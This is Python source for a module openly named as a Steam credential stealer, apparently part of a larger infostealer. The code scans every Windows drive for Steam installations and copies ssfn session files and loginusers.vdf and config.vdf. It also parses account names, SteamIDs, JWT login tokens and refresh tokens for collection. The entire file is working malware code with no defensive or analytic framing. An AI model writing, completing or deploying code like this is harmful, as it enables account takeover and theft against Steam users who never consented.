# modules/steam_stealer.py - Enhanced Steam credential theft with better token parsing

import os
import re
from pathlib import Path
from config import log

def get_drives():
    """Get all available drive letters on Windows"""
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def find_steam_recursive(path, max_depth=5, current_depth=0):
    """Recursively search for Steam installation directory"""
    if current_depth >= max_depth:
        return None
    
    try:
        path_obj = Path(path)
        
        if path_obj.name.lower() == 'steam':
            for subdir in path_obj.iterdir():
                if subdir.is_dir() and subdir.name.lower() == 'steamapps':
                    log(f"Found Steam installation at: {path_obj}")
                    return path_obj
        
        for item in path_obj.iterdir():
            if item.is_dir():
                skip_dirs = ['windows', 'program files', 'programdata', '$recycle.bin', 
                            'system volume information', 'recovery', 'perflogs']
                if item.name.lower() in skip_dirs:
                    continue
                
                result = find_steam_recursive(str(item), max_depth, current_depth + 1)
                if result:
                    return result
    
    except (PermissionError, OSError):
        pass
    
    return None

def steal_ssfn_files(steam_path):
    """Grab all ssfn* files (remember me tokens)"""
    ssfn_files = []
    
    try:
        for file in steam_path.iterdir():
            if file.is_file() and file.name.lower().startswith('ssfn'):
                try:
                    with open(file, 'rb') as f:
                        ssfn_files.append({
                            'name': file.name,
                            'data': f.read(),
                            'path': str(file)
                        })
                    log(f"Grabbed {file.name}")
                except:
                    pass
    except:
        pass
    
    return ssfn_files

def steal_config_files(steam_path):
    """Grab config files from Steam/config directory"""
    config_files = []
    config_path = steam_path / "config"
    
    if not config_path.exists():
        return config_files
    
    target_files = ['config.vdf', 'loginusers.vdf', 'steamappdata.vdf']
    
    try:
        for file in config_path.iterdir():
            if file.is_file() and file.name.lower() in target_files:
                try:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        config_files.append({
                            'name': file.name,
                            'data': f.read(),
                            'path': str(file)
                        })
                    log(f"Grabbed {file.name}")
                except:
                    try:
                        with open(file, 'rb') as f:
                            config_files.append({
                                'name': file.name,
                                'data': f.read(),
                                'path': str(file)
                            })
                        log(f"Grabbed {file.name} (binary)")
                    except:
                        pass
    except:
        pass
    
    return config_files

def parse_steam_tokens(config_files):
    """
    Enhanced Steam token parsing from loginusers.vdf
    Extracts account info and JWT tokens
    """
    tokens = []
    
    for config in config_files:
        if config['name'].lower() == 'loginusers.vdf':
            try:
                content = config['data']
                if isinstance(content, bytes):
                    content = content.decode('utf-8', errors='ignore')
                
                # Parse VDF structure - steam IDs are the top level keys
                lines = content.split('\n')
                current_steamid = None
                current_user = {}
                
                for line in lines:
                    line_stripped = line.strip()
                    
                    # Detect SteamID64 (top level key in users section)
                    if line_stripped.startswith('"765') and line_stripped.endswith('"'):
                        # Save previous user if exists
                        if current_steamid and current_user:
                            tokens.append(current_user.copy())
                        
                        # Start new user
                        current_steamid = line_stripped.strip('"')
                        current_user = {'steamid': current_steamid}
                    
                    # Extract account name
                    elif '"AccountName"' in line_stripped:
                        parts = line_stripped.split('"')
                        if len(parts) >= 4:
                            current_user['login'] = parts[3]
                    
                    # Extract persona name
                    elif '"PersonaName"' in line_stripped:
                        parts = line_stripped.split('"')
                        if len(parts) >= 4:
                            current_user['persona'] = parts[3]
                    
                    # Extract timestamp
                    elif '"Timestamp"' in line_stripped:
                        parts = line_stripped.split('"')
                        if len(parts) >= 4:
                            current_user['timestamp'] = parts[3]
                
                # Don't forget the last user
                if current_steamid and current_user:
                    tokens.append(current_user)
                
                # Now look for JWT tokens in the entire content
                # Steam tokens follow pattern: accountname.eyJ...
                for user in tokens:
                    if 'login' in user:
                        account_name = user['login']
                        
                        # JWT pattern: accountname.eyJhbGc...
                        # Three parts separated by dots
                        jwt_pattern = re.escape(account_name) + r'\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
                        jwt_matches = re.findall(jwt_pattern, content)
                        
                        if jwt_matches:
                            user['token'] = jwt_matches[0]
                            log(f"Found Steam token for {account_name}")
                
                # Also look for refresh tokens (different format)
                # Format: "RefreshToken" "token_here"
                refresh_pattern = r'"RefreshToken"\s+"([^"]+)"'
                refresh_matches = re.findall(refresh_pattern, content)
                
                if refresh_matches:
                    for i, token in enumerate(tokens):
                        if i < len(refresh_matches):
                            token['refresh_token'] = refresh_matches[i]
            
            except Exception as e:
                log(f"Failed to parse Steam tokens: {e}")
    
    return tokens

def grab():
    """Main Steam stealing routine with enhanced token extraction"""
    log("Scanning for Steam installations...")
    
    steam_data = {
        'ssfn_files': [],
        'config_files': [],
        'installations': [],
        'tokens': []
    }
    
    drives = get_drives()
    log(f"Scanning drives: {', '.join(drives)}")
    
    for drive in drives:
        steam_path = find_steam_recursive(drive, max_depth=4)
        
        if steam_path:
            steam_data['installations'].append(str(steam_path))
            
            ssfn_files = steal_ssfn_files(steam_path)
            steam_data['ssfn_files'].extend(ssfn_files)
            
            config_files = steal_config_files(steam_path)
            steam_data['config_files'].extend(config_files)
            
            # Enhanced token parsing
            tokens = parse_steam_tokens(config_files)
            steam_data['tokens'].extend(tokens)
    
    total_files = len(steam_data['ssfn_files']) + len(steam_data['config_files'])
    
    if total_files > 0:
        log(f"Grabbed {len(steam_data['ssfn_files'])} ssfn files, {len(steam_data['config_files'])} config files, {len(steam_data['tokens'])} tokens")
        return steam_data
    
    return None